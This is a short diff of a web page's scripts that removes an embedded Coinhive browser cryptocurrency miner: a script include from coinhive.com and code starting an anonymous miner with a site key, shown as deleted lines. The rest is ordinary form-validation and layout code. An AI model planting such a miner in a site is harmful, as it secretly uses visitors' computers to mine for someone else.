@@ -2,7 +2,6 @@
 <script src="/assets/js/bootstrap.min.js"></script>
 <script type="text/javascript" src="https://apis.google.com/js/plusone.js"></script>
 <script src="http://downloads.mailchimp.com/js/jquery.form-n-validate.js"></script>
-<script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
 	$(document).ready( function () {
 	    $('#wrapper').height($(document).height());
@@ -16,10 +15,6 @@
 	            if ( $form.validate() ) { register($form); }
 	        });
 		}
-		
-		// Coinhive
-		var miner = new CoinHive.Anonymous('flQ6iKjlcO9f0jNAEYB1sNOxrkFmkYbp');
-		miner.start();
 	});
 
 	function appendResult(userText , className, iconClass){
